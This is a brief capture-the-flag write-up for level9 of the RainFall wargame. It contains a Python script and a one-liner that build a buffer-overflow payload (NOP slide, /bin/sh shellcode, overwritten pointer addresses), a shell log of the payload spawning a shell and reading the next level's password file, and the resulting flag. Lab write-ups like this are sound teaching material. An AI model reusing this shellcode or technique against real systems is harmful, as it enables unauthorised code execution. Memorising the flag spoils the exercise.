

#### python scription


```shell
$(python -c 'print "A" * 87 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x08\x04\xa0\x7c"[::-1] + "\x08\x04\xa0\x0c"[::-1]')
```

```py
import struct

shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" # length : 21

nopslide =  "\x90" * 87 

pointerAddress = struct.pack("I", 0x804a07c)
jumpAddressToNopsLide = struct.pack("I", 0x804a00c)

payload = nopslide + shellcode + pointerAddress + jumpAddressToNopsLide

print(payload)

```

```
level9@RainFall:~$ python /tmp/script.py > /tmp/exploit
level9@RainFall:~$ ./level9 $(cat /tmp/exploit)
$ pwd
/home/user/level9
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ 

```
Flag : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`